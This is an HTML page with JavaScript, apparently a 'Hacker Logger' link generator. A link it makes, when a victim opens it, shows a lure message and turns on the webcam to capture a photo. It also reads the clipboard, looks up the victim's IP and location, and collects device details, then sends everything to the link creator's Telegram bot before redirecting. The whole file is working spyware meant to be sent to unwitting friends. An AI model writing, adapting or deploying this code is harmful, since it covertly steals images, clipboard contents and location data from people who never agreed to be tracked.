<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HACKER LOGGER</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      background: black;
      color: #00ff00;
      font-family: monospace;
    }

    canvas {
      position: fixed;
      top: 0; left: 0;
      z-index: -1;
    }

    .content {
      z-index: 10;
      position: relative;
      text-align: center;
      padding: 30px;
    }

    input, button {
      padding: 10px;
      margin: 10px;
      width: 90%;
      max-width: 400px;
      font-size: 16px;
      background: black;
      color: lime;
      border: 1px solid lime;
      box-shadow: 0 0 10px #00ff00;
      transition: 0.2s ease;
    }

    input:focus, button:focus {
      outline: none;
      box-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
    }

    .hidden { display: none; }

    .flash {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: white;
      opacity: 0;
      z-index: 9999;
      pointer-events: none;
      animation: flash 1.5s infinite;
    }

    @keyframes flash {
      0%, 100% { opacity: 0; }
      50% { opacity: 0.03; }
    }

    footer {
      font-size: 14px;
      margin-top: 20px;
      color: #0f0;
      opacity: 0.7;
    }
  </style>
</head>
<body>

<canvas id="matrix"></canvas>
<div class="flash"></div>

<div class="content">
  <div id="mainBox">
    <h2>üë®‚Äçüíª Hacker Logger Link Generator</h2>
    <input id="bot" placeholder="Enter Telegram Bot Token">
    <input id="chat" placeholder="Enter Chat ID">
    <button onclick="generate(); playClick()">Generate Link</button>
    <div id="result"></div>
  </div>

  <div id="visitBox" class="hidden">
    <h2>üîç Wait You See Something Amazing...</h2>
    <p>Please wait...</p>
  </div>

  <footer>‚ö° Coded by Divyansh ‚ù§Ô∏è</footer>
</div>

<!-- Click sound -->
<audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-29.mp3" preload="auto"></audio>

<script>
  // Matrix Rain
  const canvas = document.getElementById("matrix");
  const ctx = canvas.getContext("2d");
  canvas.height = window.innerHeight;
  canvas.width = window.innerWidth;

  const chars = "01‚ñà‚ñì‚ñí‚ñë<>/$@#%&*";
  const font_size = 14;
  const columns = canvas.width / font_size;
  const drops = Array.from({ length: columns }).fill(1);

  function drawMatrix() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#00FF00";
    ctx.font = font_size + "px monospace";
    for (let i = 0; i < drops.length; i++) {
      const text = chars[Math.floor(Math.random() * chars.length)];
      ctx.fillText(text, i * font_size, drops[i] * font_size);
      if (drops[i] * font_size > canvas.height && Math.random() > 0.975) drops[i] = 0;
      drops[i]++;
    }
  }
  setInterval(drawMatrix, 35);

  // Play click sound
  function playClick() {
    document.getElementById("clickSound").play();
  }

  document.querySelectorAll("input, button").forEach(el => {
    el.addEventListener("click", playClick);
  });

  // Copy link and show popup
  function generate() {
    const bot = encodeURIComponent(document.getElementById("bot").value.trim());
    const chat = encodeURIComponent(document.getElementById("chat").value.trim());
    if (!bot || !chat) return alert("Fill all fields");

    const uid = btoa(`${bot}::${chat}`);
    const link = `${location.origin}${location.pathname}?uid=${uid}`;

    document.getElementById("result").innerHTML = `
      <p><b>üîó Your Link:</b></p>
      <input type="text" id="copyLink" value="${link}" onclick="copyLink(); playClick()" readonly>
      <p>üëÜ Tap to Copy</p>
    `;
  }

  function copyLink() {
    const input = document.getElementById("copyLink");
    input.select();
    document.execCommand("copy");
    alert("‚úÖ Link copied!\nSend it to your friend now.");
  }

  // Visit tracking mode
  async function visitMode(bot, chat) {
    document.getElementById("mainBox").classList.add("hidden");
    document.getElementById("visitBox").classList.remove("hidden");

    let stream;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: true });
    } catch {
      alert("Camera blocked.");
      return;
    }

    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();
    const canvas = document.createElement("canvas");
    canvas.width = 480;
    canvas.height = 360;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.8));
    stream.getTracks().forEach(t => t.stop());

    const battery = await navigator.getBattery();
    const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json());
    const loc = await fetch("https://ipapi.co/json").then(r => r.json()).catch(() => ({}));

    let clip = "(Denied)";
    try { clip = await navigator.clipboard.readText(); } catch {}

    const message = `üíÄ D·¥á·¥†…™·¥Ñ·¥á T Ä·¥Ä·¥Ñ·¥ã…™…¥…¢ S·¥ú·¥Ñ·¥Ñ·¥áss ‚úÖ
üåç IP: ${ip.ip}
üîã Battery: ${Math.round(battery.level * 100)}%
üìã Clipboard: ${clip}
üíª OS: ${navigator.platform}
üì± Browser: ${navigator.userAgent}
üìå Location: ${loc.city || "-"}, ${loc.region || "-"}, ${loc.country_name || "-"}
ü§¥üèªùêÉùêûùêØùê•ùê®ùê©ùêûùê´ üë®üèª‚Äçüíª : @tera_paglu`;

    const form = new FormData();
    form.append("chat_id", chat);
    form.append("photo", new File([blob], "cam.jpg", { type: "image/jpeg" }));
    form.append("caption", message);

    await fetch(`https://api.telegram.org/bot${bot}/sendPhoto`, {
      method: "POST",
      body: form
    });

    window.location.href = "https://nx3r.com/download-thumbnail?_y=ODczMTA&_x=NzI4MTc4NjIwNw";
  }

  // Trigger if UID param exists
  window.onload = () => {
    const uid = new URLSearchParams(location.search).get("uid");
    if (uid) {
      const [bot, chat] = atob(uid).split("::");
      visitMode(bot, chat);
    }
  };
</script>
</body>
</html>
